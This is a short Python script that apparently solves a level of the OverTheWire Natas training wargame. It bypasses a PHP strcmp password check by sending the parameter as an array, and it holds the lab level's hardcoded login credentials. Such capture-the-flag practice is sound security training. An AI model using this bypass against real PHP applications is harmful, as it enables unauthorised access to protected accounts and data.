import requests
from bs4 import BeautifulSoup

# PHP strcmp vulnerable to array compare (NULL == 0) return ture

username='natas24'
password='OsRmXFguozKpTZZ5X14zNO43379LZveg'
url ="http://{}.natas.labs.overthewire.org/".format(username) #?debug=True

s = requests.Session()

data = {'passwd[]':'  '}

r = s.post(url,data=data,auth=(username,password))
sp = BeautifulSoup(r.text,'lxml')

pre = sp.find_all('pre')

print(pre[0].text)